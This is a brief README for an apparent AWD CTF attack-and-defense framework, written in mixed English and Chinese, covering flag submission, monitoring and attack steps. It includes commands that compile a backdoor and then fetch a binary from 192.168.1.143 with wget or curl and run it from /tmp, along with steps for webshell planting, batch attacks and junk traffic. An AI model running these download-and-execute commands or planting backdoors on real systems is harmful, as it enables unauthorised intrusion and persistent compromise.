## Introduction
This framework is used to help enjoy the AWD-web in CTF.
Maybe in the future we can expand it into a common security test platform.

### lottery passwd
若全场ssh口令均一致时，可以快速收割一波

### 修改内容
- 交flag机的参数
- contro.py里面交flag的函数
- backdoor.c 里面回连IP
- log里面日志位置
- filecmp里面文件夹位置

### 防御
- (找到代码位置)拖源代码
- 自己给自己上一句话，用www-data的权限给自己回连内存马
- 文件监控
- 抓流量*
- 流量分析
- 交flag机调试成功

### 攻击
- webshell扫描一波
- 发现目标页面
- 批量攻击
- 上马 
    - gcc -o check backdoor.c -lpthread -g
    - cd /tmp&&wget -O check 192.168.1.143/upload/check&&chmod +x check&&./check
    - cd /tmp;curl -o check 192.168.1.143/check;chmod +x check;./check
- 垃圾流量

### notice
- www-data 无法直接反弹shell，不能执行python -c